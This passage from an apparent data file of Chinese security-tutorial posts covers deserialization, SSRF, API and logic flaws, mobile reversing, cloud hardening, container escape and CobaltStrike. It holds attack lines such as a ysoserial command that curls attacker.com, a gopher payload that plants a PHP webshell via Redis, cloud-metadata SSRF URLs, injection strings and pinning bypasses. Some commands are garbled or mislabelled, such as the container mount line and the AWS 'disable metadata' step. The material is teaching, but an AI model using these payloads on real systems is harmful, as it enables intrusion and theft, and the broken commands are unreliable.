__toString()     // 对象转字符串时
__wakeup()       // 反序列化时
__sleep()        // 序列化时
__call()         // 调用不存在方法时
\`\`\`

### 利用链构造

\`\`\`php
class FileHandler {
    public $filename;
    public function __destruct() {
        echo file_get_contents($this->filename);
    }
}

// 构造payload
$a = new FileHandler();
$a->filename = "/etc/passwd";
echo serialize($a);
\`\`\`

## Java 反序列化

### 基础

\`\`\`java
// 序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("obj.ser"));
oos.writeObject(user);

// 反序列化
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("obj.ser"));
Object obj = ois.readObject();
\`\`\`

### 常见漏洞

- **Apache Commons Collections**
- **Fastjson**
- **WebLogic**
- **Shiro**

### ysoserial 工具

\`\`\`bash
# 生成payload
java -jar ysoserial.jar CommonsCollections1 "whoami" > payload.bin

# 使用
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/steal?c=$(whoami)"
\`\`\`

## PHP 反序列化实战

### 读取文件

\`\`\`php
class Logger {
    public $logfile;
    public function __destruct() {
        file_put_contents($this->logfile, "logged");
    }
}

// 构造payload读取文件
\`\`\`

### 写入Webshell

\`\`\`php
class FileWriter {
    public $filename;
    public $content;
    public function __destruct() {
        file_put_contents($this->filename, $this->content);
    }
}
\`\`\`

## 防御方案

1. 禁用用户输入的反序列化
2. 使用白名单验证类
3. 使用 JSON 替代原生序列化
4. 升级依赖库
    `
  },
  {
    slug: 'ssrf',
    title: 'SSRF 服务端请求伪造',
    date: '2026-06-18',
    category: 'websec-advanced',
    subcategory: 'ssrf',
    tags: ['Web安全', 'SSRF', '内网'],
    summary: 'SSRF 漏洞原理、利用方式和防御方案。',
    content: `
## 什么是 SSRF

SSRF（Server-Side Request Forgery）服务端请求伪造，攻击者利用服务器发起请求，访问内部资源或绕过防火墙。

## 常见触发场景

- 图片加载/上传
- 钩子/回调功能
- 文件处理
- API 代理
- Webhook

## 利用方式

### 1. 读取本地文件

\`\`\`
?url=file:///etc/passwd
?url=file:///c:/windows/win.ini
\`\`\`

### 2. 扫描内网

\`\`\`
?url=http://192.168.1.1:8080/
?url=http://127.0.0.1:3306/
\`\`\`

### 3. 攻击内网服务

\`\`\`
?url=http://192.168.1.100/admin
?url=redis://127.0.0.1:6379/
\`\`\`

### 4. 云环境元数据

\`\`\`
# AWS
?url=http://169.254.169.254/latest/meta-data/

# 阿里云
?url=http://100.100.100.200/latest/meta-data/
\`\`\`

## 绕过技巧

### IP 地址变形

\`\`\`
http://0x7f000001/       # 十六进制
http://2130706433/       # 十进制
http://0177.0.0.1/       # 八进制
http://127.1/            # 省略写法
http://127.0.0.1.nip.io/ # DNS重绑定
\`\`\`

### 协议绕过

\`\`\`
file:///etc/passwd
gopher://127.0.0.1:6379/
dict://127.0.0.1:6379/
\`\`\`

### URL 编码

\`\`\`
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
\`\`\`

## 利用 Gopher 协议攻击 Redis

\`\`\`
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<%3fphp eval($_POST['cmd']); %3f>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
\`\`\`

## 防御方案

1. 白名单限制可访问的域名/IP
2. 禁用不需要的协议（file://、gopher://）
3. 禁止访问内网地址
4. 使用网络层隔离
    `
  },
  {
    slug: 'logic-vuln',
    title: '逻辑漏洞挖掘',
    date: '2026-06-16',
    category: 'websec-advanced',
    subcategory: 'logic-vuln',
    tags: ['Web安全', '逻辑漏洞', '业务安全'],
    summary: '常见业务逻辑漏洞类型和挖掘方法。',
    content: `
## 什么是逻辑漏洞

逻辑漏洞是由于程序逻辑设计不当，导致攻击者可以绕过正常业务流程的漏洞。

## 常见类型

### 1. 越权漏洞

#### 水平越权
\`\`\`
# 修改用户ID查看他人信息
GET /api/user/123 → GET /api/user/456
\`\`\`

#### 垂直越权
\`\`\`
# 普通用户访问管理员接口
GET /admin/dashboard
\`\`\`

### 2. 支付漏洞

#### 价格篡改
\`\`\`
# 修改价格参数
amount=100 → amount=0.01
\`\`\`

#### 数量篡改
\`\`\`
# 修改购买数量为负数
quantity=1 → quantity=-1
\`\`\`

### 3. 验证码漏洞

- 验证码回显在响应中
- 验证码可重复使用
- 可爆破验证码
- 客户端验证

### 4. 短信/邮箱轰炸

\`\`\`
# 重复发送验证码
POST /api/send_sms
phone=13800138000
# 无频率限制
\`\`\`

### 5. 数据篡改

\`\`\`
# 修改请求中的敏感字段
{"username":"admin", "role":"user"} → {"username":"admin", "role":"admin"}
\`\`\`

### 6. 竞态条件

\`\`\`
# 并发请求导致重复操作
同时发送两个购买请求 → 扣款一次，获得两件商品
\`\`\`

### 7. 回调地址

\`\`\`
# 修改回调URL
callback=http://attacker.com/steal
\`\`\`

## 接口测试

### 参数篡改
- 修改用户ID、订单号
- 修改价格、数量
- 修改角色、权限

### 流程跳过
- 跳过验证步骤
- 跳过支付步骤
- 跳过授权步骤

### 重放攻击
- 重复使用验证码
- 重复使用优惠券
- 重复提交订单

## 工具

- Burp Suite
- Postman
- YAKIT

## 防御方案

1. 服务端校验所有参数
2. 使用不可预测的ID（UUID）
3. 关键操作二次验证
4. 限制请求频率
5. 使用签名防篡改
    `
  },
  {
    slug: 'api-security',
    title: 'API 安全测试',
    date: '2026-06-14',
    category: 'websec-advanced',
    subcategory: 'api-security',
    tags: ['Web安全', 'API', 'REST', 'GraphQL'],
    summary: 'API 接口安全测试方法和常见漏洞。',
    content: `
## API 安全风险

### 1. 未授权访问

\`\`\`
# 无认证直接访问
GET /api/users/123
GET /api/admin/config
\`\`\`

### 2. 越权访问

\`\`\`
# 水平越权
GET /api/users/456  # 查看其他用户数据

# 垂直越权
GET /api/admin/users  # 普通用户访问管理接口
\`\`\`

### 3. 注入漏洞

\`\`\`json
// SQL注入
{"username": "admin' OR '1'='1"}

// NoSQL注入
{"username": {"$gt": ""}, "password": {"$gt": ""}}

// 命令注入
{"name": "test; whoami"}
\`\`\`

### 4. 批量赋值

\`\`\`json
// 修改不应被修改的字段
{
  "username": "normaluser",
  "role": "admin",      // 不应可修改
  "balance": 1000000    // 不应可修改
}
\`\`\`

### 5. 速率限制绕过

\`\`\`
# 使用不同IP
X-Forwarded-For: 1.1.1.1

# 使用不同User-Agent
User-Agent: Mobile

# 使用不同参数
?phone=13800138000
?phone=13800138001
\`\`\`

## REST API 测试

### 常见检查点

| 方法 | 检查点 |
|------|--------|
| GET | 越权访问、数据泄露 |
| POST | 注入、批量赋值 |
| PUT | 越权修改、数据篡改 |
| DELETE | 越权删除 |
| OPTIONS | CORS配置 |

### HTTP 头检查

\`\`\`
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
\`\`\`

## GraphQL 安全

### 内省查询

\`\`\`graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
\`\`\`

### 常见漏洞

- 内省查询泄露API结构
- 批量查询导致DoS
- 注入漏洞

## JWT 安全

### 常见问题

\`\`\`
# 算法混淆
{"alg": "none"}

# 弱密钥
HS256 使用弱密钥

# 密钥泄露
\`\`\`

### 检查命令

\`\`\`bash
# JWT解析
jwt_tool token.txt

# 爆破密钥
hashcat -m 16500 jwt.txt wordlist.txt
\`\`\`

## 防御方案

1. 实施认证和授权
2. 输入验证
3. 速率限制
4. 日志监控
5. 使用 HTTPS
6. API 网关
    `
  },
  {
    slug: 'wasm-reverse',
    title: 'WebAssembly 逆向入门',
    date: '2026-06-12',
    category: 'websec-advanced',
    subcategory: 'wasm',
    tags: ['Web安全', 'WASM', '逆向'],
    summary: 'WebAssembly 逆向分析基础。',
    content: `
## 什么是 WebAssembly

WebAssembly（WASM）是一种可移植的二进制格式，可在浏览器中运行。常用于保护前端敏感逻辑。

## WASM 文件分析

### 识别 WASM

\`\`\`javascript
// 检查是否加载了WASM
const wasmModule = new WebAssembly.Module(buffer);
console.log(WebAssembly.Module.exports(wasmModule));
\`\`\`

### 使用 wasm-decompile

\`\`\`bash
# 安装
npm install -g wabt

# 反编译
wasm-decompile module.wasm -o output.c
\`\`\`

### 使用 wasm-objdump

\`\`\`bash
# 查看结构
wasm-objdump -x module.wasm

# 反汇编
wasm-objdump -d module.wasm
\`\`\`

## 常见逆向工具

| 工具 | 用途 |
|------|------|
| wasm-decompile | 反编译为伪C代码 |
| wasm-objdump | 查看结构和反汇编 |
| Ghidra | 二进制分析 |
| Binary Ninja | 二进制分析 |
| IDA Pro | 二进制分析 |

## 浏览器调试

### Chrome DevTools

1. 打开 Sources 面板
2. 找到 WASM 文件
3. 设置断点调试

### 导出函数分析

\`\`\`javascript
// 获取WASM导出函数
const exports = instance.exports;
console.log(Object.keys(exports));
\`\`\`

## 逆向流程

1. 定位 WASM 文件
2. 分析导出函数
3. 反编译分析逻辑
4. 找到关键函数
5. 编写调用脚本

## 实战技巧

\`\`\`javascript
// Hook WASM函数
const originalFn = exports.targetFunction;
exports.targetFunction = function(...args) {
    console.log('Args:', args);
    const result = originalFn(...args);
    console.log('Result:', result);
    return result;
};
\`\`\`
    `
  },
  // 移动端安全
  {
    slug: 'android-reverse',
    title: 'Android 逆向基础',
    date: '2026-06-15',
    category: 'mobile',
    subcategory: 'android-reverse',
    tags: ['移动端安全', 'Android', '逆向'],
    summary: 'Android APK 逆向分析基础。',
    content: `
## Android 逆向工具

| 工具 | 用途 |
|------|------|
| jadx | APK 反编译 |
| apktool | 资源解包 |
| dex2jar | DEX 转 JAR |
| JD-GUI | Java 反编译器 |
| Frida | 动态Hook |
| Objection | 移动安全框架 |

## 反编译流程

\`\`\`bash
# jadx 反编译
jadx -d output/ target.apk

# apktool 解包
apktool d target.apk

# dex2jar 转换
d2j-dex2jar target.apk
\`\`\`

## 常见保护

### 代码混淆

\`\`\`java
// 混淆前
public class UserManager {
    public void login(String username, String password) { }
}

// 混淆后
public class a {
    public void b(String c, String d) { }
}
\`\`\`

### 加壳

- VMP（虚拟机保护）
- DexProtector
- 360加固
- 腾讯乐固

## Frida Hook

### Java Hook

\`\`\`javascript
// Hook Java 方法
Java.perform(function() {
    var UserManager = Java.use("com.target.UserManager");
    UserManager.login.implementation = function(username, password) {
        console.log("Username: " + username);
        console.log("Password: " + password);
        return this.login(username, password);
    };
});
\`\`\`

### Native Hook

\`\`\`javascript
// Hook native函数
Interceptor.attach(Module.findExportByName("libtarget.so", "check"), {
    onEnter: function(args) {
        console.log("Arg0: " + Memory.readUtf8String(args[0]));
    },
    onLeave: function(retval) {
        console.log("Return: " + retval);
        retval.replace(1);  // 修改返回值
    }
});
\`\`\`

## APK 结构

\`\`\`
target.apk
├── AndroidManifest.xml    # 配置文件
├── classes.dex            # DEX代码
├── resources.arsc         # 资源文件
├── lib/                   # Native库
├── assets/                # 资源文件
└── META-INF/              # 签名信息
\`\`\`

## 签名绕过

\`\`\`bash
# 使用apktool解包
apktool d target.apk

# 修改后重新打包
apktool b target/

# 签名
jarsigner -keystore keystore.apk target.apk alias
\`\`\`
    `
  },
  {
    slug: 'android-pentest',
    title: 'Android 渗透测试',
    date: '2026-06-13',
    category: 'mobile',
    subcategory: 'android-pentest',
    tags: ['移动端安全', 'Android', '渗透测试'],
    summary: 'Android 应用安全测试方法。',
    content: `
## 测试环境搭建

\`\`\`bash
# 安装ADB
apt install android-tools-adb

# 连接设备
adb devices
adb shell

# 安装APK
adb install target.apk
\`\`\`

## 组件安全测试

### Activity 暴露

\`\`\`xml
<!-- AndroidManifest.xml -->
<activity android:exported="true" />
\`\`\`

\`\`\`bash
# 启动暴露的Activity
adb shell am start -n com.target/.MainActivity
\`\`\`

### Service 暴露

\`\`\`bash
# 启动服务
adb shell am startservice com.target/.MyService
\`\`\`

### Content Provider

\`\`\`bash
# 查询ContentProvider
adb shell content query --uri content://com.target.provider/data
\`\`\`

### BroadcastReceiver

\`\`\`bash
# 发送广播
adb shell am broadcast -a com.target.ACTION
\`\`\`

## 数据存储安全

### SharedPreferences

\`\`\`bash
# 查找SharedPreferences
adb shell run-as com.target cat /data/data/com.target/shared_prefs/*.xml
\`\`\`

### SQLite 数据库

\`\`\`bash
# 查找数据库
adb shell run-as com.target ls /data/data/com.target/databases/

# 导出数据库
adb pull /data/data/com.target/databases/app.db
\`\`\`

## 流量分析

### 使用 BurpSuite

\`\`\`
1. 配置Burp代理
2. 安装Burp证书
3. 设置手机代理
4. 抓包分析
\`\`\`

### 使用 Frida

\`\`\`javascript
// SSL Pinning绕过
Java.perform(function() {
    var TrustManager = Java.registerClass({
        name: "com.target.TrustManager",
        implements: [Java.use("javax.net.ssl.X509TrustManager")],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
});
\`\`\`

## 常见漏洞

1. 组件暴露
2. 数据明文存储
3. 弱加密算法
4. 不安全的网络通信
5. 代码可逆向
    `
  },
  {
    slug: 'ios-reverse',
    title: 'iOS 逆向基础',
    date: '2026-06-11',
    category: 'mobile',
    subcategory: 'ios-reverse',
    tags: ['移动端安全', 'iOS', '逆向'],
    summary: 'iOS 应用逆向分析基础。',
    content: `
## iOS 逆向工具

| 工具 | 用途 |
|------|------|
| class-dump | 导出类信息 |
| Hopper | 二进制分析 |
| IDA Pro | 二进制分析 |
| Frida | 动态Hook |
| Reveal | UI分析 |
| Keychain-Dumper | 钥匙串导出 |

## IPA 文件结构

\`\`\`
target.ipa
├── Payload/
│   └── target.app/
│       ├── Info.plist
│       ├── target (Mach-O)
│       ├── Frameworks/
│       └── _CodeSignature/
\`\`\`

## 反编译流程

\`\`\`bash
# 解压IPA
unzip target.ipa -d output/

# 导出类信息
class-dump target.app/target > classes.h

# 使用Hopper分析
\`\`\`

## 代码签名

\`\`\`bash
# 查看签名
codesign -dvvv target.app

# 重签名
codesign -f -s "iPhone Developer: xxx" target.app

# 使用ios-deploy
ios-deploy --bundle target.app
\`\`\`

## Frida Hook

### Objective-C Hook

\`\`\`javascript
// Hook OC方法
var_resolver = new ApiResolver("objc");
var resolver = new ApiResolver("objc");
resolver.enumerateMatches({
    pattern: '-[* userController]',
    onMatch: function(match) {
        var impl = new NativeFunction(match.address, 'void', ['pointer', 'pointer']);
        Interceptor.attach(match.address, {
            onEnter: function(args) {
                var password = ObjC.Object(args[2]);
                console.log("Password: " + password.toString());
            }
        });
    }
});
\`\`\`

### Swift Hook

\`\`\`javascript
// Hook Swift函数
var module = Process.getModuleByName("target");
module.enumerateSymbols().forEach(function(symbol) {
    if (symbol.name.indexOf("ViewController") !== -1) {
        console.log(symbol.name);
    }
});
\`\`\`

## 越狱检测绕过

\`\`\`javascript
// 常见越狱检测
var jailbreakChecks = [
    "/Applications/Cydia.app",
    "/Library/MobileSubstrate/MobileSubstrate.dylib",
    "/bin/bash",
    "/usr/sbin/sshd"
];

// 绕过
Interceptor.attach(Module.findExportByName(null, "access"), {
    onEnter: function(args) {
        this.path = args[0].readUtf8String();
    },
    onLeave: function(retval) {
        if (this.path && jailbreakChecks.indexOf(this.path) !== -1) {
            retval.replace(-1);
        }
    }
});
\`\`\`

## Keychain 分析

\`\`\`bash
# 导出钥匙串
iOS/keychain-dumper

# 使用Keychain Dump
keychain-dumper -a
\`\`\`
    `
  },
  {
    slug: 'miniapp-pentest',
    title: '微信小程序渗透测试',
    date: '2026-06-10',
    category: 'mobile',
    subcategory: 'miniapp-pentest',
    tags: ['移动端安全', '小程序', '渗透测试'],
    summary: '微信小程序安全测试方法。',
    content: `
## 小程序结构

\`\`\`
target/
├── app.js
├── app.json
├── app.wxss
├── pages/
└── project.config.json
\`\`\`

## 获取小程序包

### 方法1：模拟器

\`\`\`
1. 使用PC版微信
2. 打开小程序
3. 在文档目录查找wxapkg文件
\`\`\`

### 方法2：抓包

\`\`\`
1. 使用BurpSuite抓包
2. 找到小程序下载链接
3. 下载wxapkg文件
\`\`\`

## 反编译

\`\`\`bash
# 安装工具
npm install -g wxappUnpacker

# 反编译
wxappUnpacker target.wxapkg

# 或使用 unveilr
unveilr target.wxapkg -o output/
\`\`\`

## 安全测试

### 接口测试

\`\`\`
1. 找到API接口
2. 测试未授权访问
3. 测试参数篡改
4. 测试注入漏洞
\`\`\`

### 配置文件

\`\`\`javascript
// 检查app.json
{
  "appid": "wx...",
  "serverUrl": "https://api.target.com"
}

// 检查是否有敏感信息
\`\`\`

### 代码审计

\`\`\`javascript
// 检查硬编码密钥
var secret = "1234567890abcdef";

// 检查不安全存储
wx.setStorageSync('token', token);
\`\`\`

## 常见漏洞

1. 接口未授权
2. 敏感信息泄露
3. 不安全的数据存储
4. 逻辑漏洞
5. 注入漏洞

## 工具

- **wxappUnpacker**：反编译
- **unveilr**：反编译
- **BurpSuite**：抓包
- **Fiddler**：抓包
    `
  },
  // 云安全
  {
    slug: 'aws-security',
    title: 'AWS 安全配置指南',
    date: '2026-06-09',
    category: 'cloud',
    subcategory: 'aws-security',
    tags: ['云安全', 'AWS', '配置'],
    summary: 'AWS 云环境安全配置最佳实践。',
    content: `
## IAM 安全

### 最小权限原则

\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::bucket/*"
    }
  ]
}
\`\`\`

### 多因素认证

\`\`\`bash
# 启用MFA
aws iam enable-mfa-user --user-name admin --serial-number arn:aws:iam::123456789:mfa/admin
\`\`\`

## S3 存储桶安全

### 访问控制

\`\`\`bash
# 检查公开访问
aws s3api get-bucket-acl --bucket my-bucket

# 禁用公开访问
aws s3api put-public-access-block --bucket my-bucket --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true
\`\`\`

### 加密

\`\`\`bash
# 启用默认加密
aws s3api put-bucket-encryption --bucket my-bucket --server-side-encryption-configuration '{"Rules":[{"ApplyServerSideEncryptionByDefault":{"SSEAlgorithm":"AES256"}}]}'
\`\`\`

## EC2 安全

### 安全组

\`\`\`bash
# 只开放必要端口
aws ec2 authorize-security-group-ingress --group-id sg-xxx --protocol tcp --port 22 --cidr 0.0.0.0/0
\`\`\`

### 实例元数据

\`\`\`bash
# 禁用元数据（防SSRF）
curl http://169.254.169.254/latest/meta-data/
\`\`\`

## CloudTrail

\`\`\`bash
# 启用日志
aws cloudtrail create-logging-status --name my-trail --s3-bucket-name my-bucket

# 查看日志
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin
\`\`\`

## 安全工具

- **Prowler**：AWS安全审计
- **ScoutSuite**：云安全审计
- **CloudMapper**：AWS架构可视化
    `
  },
  {
    slug: 'docker-security',
    title: 'Docker 安全最佳实践',
    date: '2026-06-08',
    category: 'cloud',
    subcategory: 'docker-security',
    tags: ['云安全', 'Docker', '容器'],
    summary: 'Docker 容器安全配置和加固。',
    content: `
## 镜像安全

### 使用最小基础镜像

\`\`\`dockerfile
# 使用Alpine
FROM alpine:3.18

# 避免使用
FROM ubuntu:latest
\`\`\`

### 非Root用户

\`\`\`dockerfile
RUN adduser -D appuser
USER appuser
\`\`\`

### 扫描漏洞

\`\`\`bash
# 使用Trivy
trivy image nginx:latest

# 使用Snyk
snyk container test nginx:latest
\`\`\`

## 运行时安全

### 只读文件系统

\`\`\`bash
docker run --read-only --tmpfs /tmp nginx
\`\`\`

### 资源限制

\`\`\`bash
docker run --memory=512m --cpus=1 nginx
\`\`\`

### 禁用特权

\`\`\`bash
# 避免使用
docker run --privileged nginx
\`\`\`

## 网络安全

### 使用自定义网络

\`\`\`bash
docker network create --driver bridge my-network
docker run --network my-network nginx
\`\`\`

### 限制容器间通信

\`\`\`bash
docker run --icc=false nginx
\`\`\`

## Docker Bench

\`\`\`bash
# 运行安全检查
docker run -it --net host --pid host docker/docker-bench-security
\`\`\`

## 常见风险

1. 特权容器逃逸
2. 镜像漏洞
3. 敏感信息泄露
4. 不安全的网络配置
5. 资源滥用
    `
  },
  {
    slug: 'k8s-security',
    title: 'Kubernetes 安全',
    date: '2026-06-07',
    category: 'cloud',
    subcategory: 'k8s-security',
    tags: ['云安全', 'Kubernetes', 'K8s'],
    summary: 'Kubernetes 集群安全配置。',
    content: `
## RBAC 权限控制

\`\`\`yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: default
  name: pod-reader
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "watch", "list"]
\`\`\`

## Pod 安全

### Security Context

\`\`\`yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
  containers:
  - name: app
    image: nginx
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
\`\`\`

## 网络策略

\`\`\`yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
\`\`\`

## Secret 管理

\`\`\`bash
# 创建Secret
kubectl create secret generic my-secret --from-literal=password=xxx

# 加密存储
# 启用加密
\`\`\`

## 安全审计

\`\`\`bash
# 检查集群配置
kube-bench run

# 检查镜像漏洞
trivy image nginx:latest
\`\`\`

## 常见攻击面

1. API Server 未授权
2. etcd 数据泄露
3. 容器逃逸
4. 横向移动
5. 特权提升
    `
  },
  {
    slug: 'container-escape',
    title: '容器逃逸技术',
    date: '2026-06-06',
    category: 'cloud',
    subcategory: 'container-escape',
    tags: ['云安全', '容器逃逸', '渗透测试'],
    summary: '容器逃逸的常见方法和利用。',
    content: `
## 什么是容器逃逸

容器逃逸是指从容器环境突破隔离，获得宿主机权限。

## 逃逸方法

### 1. 特权容器逃逸

\`\`\`bash
# 检查是否特权
cat /proc/1/status | grep CapEff

# 挂载宿主机磁盘
mkdir /tmp/host
mount /dev/sda1 /tmp/cat /tmp/host/etc/shadow
\`\`\`

### 2. Docker Socket 挂载

\`\`\`bash
# 检查是否有docker.sock
ls -la /var/run/docker.sock

# 使用docker命令
docker run -v /:/host alpine chroot /host
\`\`\`

### 3. CVE-2019-5736

\`\`\`bash
# runc漏洞
# 覆盖runc二进制文件
\`\`\`

### 4. CVE-2020-15257

\`\`\`bash
# containerd漏洞
# 通过containerd-shim逃逸
\`\`\`

### 5. _procfs 逃逸

\`\`\`bash
# 挂载/proc
mount -t proc proc /proc

# 获取宿主机进程信息
\`\`\`

### 6. cgroup 逃逸

\`\`\`bash
# 利用cgroup执行命令
\`\`\`

## 检测方法

\`\`\`bash
# 检查容器逃逸痕迹
cat /proc/1/cgroup
ls -la /proc/1/ns/

# 检查挂载点
mount | grep -v "overlay|proc|sys|dev"
\`\`\`

## 防御方案

1. 不使用特权容器
2. 不挂载Docker Socket
3. 使用只读文件系统
4. 限制容器能力
5. 定期更新容器运行时

## 工具

- **CDK**：容器渗透工具
- **Breach**：容器安全审计
- **Deepce**：容器枚举
     `
  },
  {
    slug: 'cobaltstrike-guide',
    title: 'CobaltStrike 使用指南',
    date: '2026-05-25',
    category: 'tools',
    subcategory: 'cobaltstrike',
    tags: ['工具', 'CobaltStrike', '红队', 'C2'],
    summary: 'CobaltStrike 红队 C2 框架基础使用。',
    content: `
## CobaltStrike 简介

CobaltStrike 是商业级渗透测试平台，提供 C2（Command and Control）能力。

## 核心功能

### Listeners（监听器）
- HTTP/HTTPS Beacon
- DNS Beacon
- SMB Beacon
- TCP Beacon

### Attacks（攻击）
- Web Drive-by（钓鱼网站）
- Spear Phishing（钓鱼邮件）
- Payload 生成

### Host（主机管理）
- Beacon 管理
- 文件管理
- 键盘记录
- 截屏

## 基础操作

### 生成 Payload

\`\`\`
Attacks → Payload Generation → Windows Executable
\`\`\`

### 设置监听器

\`\`\`
Cobalt Strike → Listeners → Add
\`\`\`

### 执行 Payload
将生成的可执行文件在目标机器上运行。

### 交互命令

\`\`\`
shell cmd.exe           # 执行命令
download file           # 下载文件
upload file             # 上传文件
keylogger               # 键盘记录
screenshot              # 截屏
hashdump                # 获取哈希
\`\`\`

## 权限提升

\`\`\`
getsystem               # 提权
bypassuac               # 绕过UAC
\`\`\`

## 横向移动

\`\`\`
spawn                  # 生成新Beacon
jump psexec            # PsExec横向
jump winrm             # WinRM横向
\`\`\`

## 注意事项

- CobaltStrike 是商业软件，需授权使用
- 仅用于合法渗透测试
- 注意通信特征检测
    `
  },
  {
    slug: 'wireshark-guide',
    title: 'Wireshark 深度分析指南',
    date: '2026-05-22',
    category: 'tools',
    subcategory: 'wireshark-tool',
    tags: ['工具', 'Wireshark', '流量分析'],
    summary: 'Wireshark 高级过滤和分析技巧。',
    content: `
## 高级过滤

### HTTP 过滤

\`\`\`
http.request.method == "POST"
http.request.uri contains "login"
http.response.code >= 400
http.cookie contains "session"
\`\`\`

### TCP 分析

\`\`\`
tcp.analysis.retransmission    # 重传
tcp.analysis.zero_window       # 零窗口
tcp.analysis.duplicate_ack     # 重复ACK
tcp.flags.reset == 1           # RST包
\`\`\`

### DNS 分析

\`\`\`
dns.qry.name contains "malware"
dns.flags.rcode != 0           # DNS错误
dns.resp.len > 0               # 有响应
\`\`\`

### SSL/TLS 分析

\`\`\`
ssl.handshake.type == 1        # Client Hello
ssl.handshake.type == 2        # Server Hello
tls.handshake.extensions_server_name contains "target"
\`\`\`

## 提取数据

### 导出文件

\`\`\`
File → Export Objects → HTTP
File → Export Objects → DICOM
File → Export Objects → SMB
\`\`\`

### 提取HTTP流

\`\`\`
右键 → Follow → HTTP Stream
\`\`\`

## 统计分析

### 会话统计

\`\`\`
Statistics → Conversations
Statistics → Protocol Hierarchy
Statistics → Endpoints
\`\`\`

### IO Graph

\`\`\`
Statistics → I/O Graphs
\`\`\`

## Tshark 命令行

\`\`\`bash
# 捕获HTTP POST
tshark -i eth0 -Y "http.request.method == POST" -T fields -e http.request.uri

# 提取DNS查询
tshark -i eth0 -Y "dns.qry.name" -T fields -e dns.qry.name

# 统计IP地址
tshark -r capture.pcap -T fields -e ip.src | sort | uniq -c | sort -rn
\`\`\`

## 安全分析

### 检测异常流量

\`\`\`
# 大量DNS查询
dns.qry.name && frame.len > 100

# 可疑HTTP请求
http.user_agent contains "curl"

# 异常端口
tcp.port == 4444
\`\`\`

### 分析恶意软件

\`\`\`
# C2通信
tcp.flags.syn == 1 && tcp.flags.ack == 0
http.request.method == "POST" && http.content_length > 1000
\`\`\`
    `
  },
  {
    slug: 'tcp-ip-basics',
    title: 'TCP/IP 基础',
    date: '2026-06-18',
    category: 'network',
    subcategory: 'tcp-ip',
    tags: ['网络', 'TCP', 'IP', '基础'],
    summary: 'TCP/IP 四层模型、三次握手、四次挥手详解。',
    content: `
## TCP/IP 四层模型

| 层 | 协议 |
|---|---|
| 应用层 | HTTP, FTP, DNS, SMTP |
| 传输层 | TCP, UDP |
| 网络层 | IP, ICMP, ARP |
| 网络接口层 | Ethernet, Wi-Fi |

## 三次握手

1. **SYN** → 客户端发送连接请求
2. **SYN+ACK** → 服务端确认并回复
3. **ACK** → 客户端确认，连接建立

## 四次挥手

1. **FIN** → 主动方请求关闭
2. **ACK** → 被动方确认
3. **FIN** → 被动方请求关闭
4. **ACK** → 主动方确认，连接关闭

## 常见端口

\`\`\`
21 - FTP
22 - SSH
23 - Telnet
25 - SMTP
53 - DNS
80 - HTTP
443 - HTTPS
3306 - MySQL
3389 - RDP
\`\`\`
    `
  },
  {
    slug: 'http-https-protocol',
    title: 'HTTP/HTTPS 协议详解',
    date: '2026-06-15',
    category: 'network',
    subcategory: 'http-https',
    tags: ['网络', 'HTTP', 'HTTPS', '协议'],
    summary: 'HTTP 请求方法、状态码、HTTPS 加密原理。',
    content: `
## HTTP 请求方法

- **GET** - 获取资源
- **POST** - 提交数据
- **PUT** - 更新资源
- **DELETE** - 删除资源
- **OPTIONS** - 查询支持的方法

## 常见状态码

| 状态码 | 含义 |
|--------|------|
| 200 | 成功 |
| 301 | 永久重定向 |
| 302 | 临时重定向 |
| 403 | 禁止访问 |
| 404 | 未找到 |
| 500 | 服务器错误 |

## HTTPS 加密流程

1. 客户端发起 HTTPS 请求
2. 服务端返回证书（公钥）
3. 客户端验证证书合法性
4. 客户端生成随机密钥，用公钥加密发送
5. 服务端用私钥解密得到随机密钥
6. 双方使用随机密钥进行对称加密通信
    `
  },
  // Web 安全
  {
    slug: 'sql-injection',
    title: 'SQL 注入完全指南',
    date: '2026-06-20',
    category: 'websec',
    subcategory: 'sqli',
    tags: ['Web安全', 'SQL注入', '渗透测试'],
    summary: 'SQL 注入原理、分类、检测方法、利用技巧和防御方案。',
    content: `
## 什么是 SQL 注入

SQL 注入是通过在输入参数中插入恶意 SQL 语句，使数据库执行非预期操作的攻击方式。攻击者可以绕过认证、窃取数据、甚至控制服务器。

## 注入原理

正常查询：
\`\`\`sql
SELECT * FROM users WHERE username='admin' AND password='123456'
\`\`\`

注入后：
\`\`\`sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- 注释掉密码验证，直接登录
\`\`\`

## 注入分类

### 按注入点分类

| 类型 | 示例 | 特征 |
|------|------|------|
| 数字型 | \`?id=1 AND 1=1\` | 无引号包裹 |
| 字符型 | \`?name=admin' AND '1'='1\` | 单引号包裹 |
| 搜索型 | \`?keyword=test%' AND '1'='1\` | LIKE 语句 |
| 布尔型 | \`?id=1' AND (SELECT LENGTH(database()))>5--\` | 条件判断 |

### 按技术分类

